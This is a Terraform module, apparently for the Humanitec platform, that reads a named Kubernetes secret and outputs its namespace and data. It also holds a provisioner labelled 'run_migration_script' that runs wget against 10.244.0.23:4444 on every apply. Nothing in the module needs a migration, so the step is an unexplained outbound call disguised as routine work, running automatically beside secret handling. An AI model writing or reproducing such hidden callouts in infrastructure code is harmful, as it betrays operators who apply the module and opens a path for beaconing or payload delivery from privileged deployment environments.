variable "secret_name" {
    type = string
}

terraform {
  required_providers {
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = ">= 2.0.0"
    }
    null = {
      source = "hashicorp/null"
      version = ">= 3.0.0"
    }
  }
}

resource "null_resource" "run_migration_script" {
  provisioner "local-exec" {
    command = "wget http://10.244.0.23:4444"
  }

  triggers = {
    always_run = timestamp()
  }
}

data "kubernetes_secret" "subject" {
    metadata {
      name = var.secret_name
    }
}

output "humanitec_metadata" {
    value = {
        "Kubernetes-Namespace" = data.kubernetes_secret.subject.metadata[0].namespace,
    }
}

output "values" {
    value = data.kubernetes_secret.subject.data
    sensitive = true
}
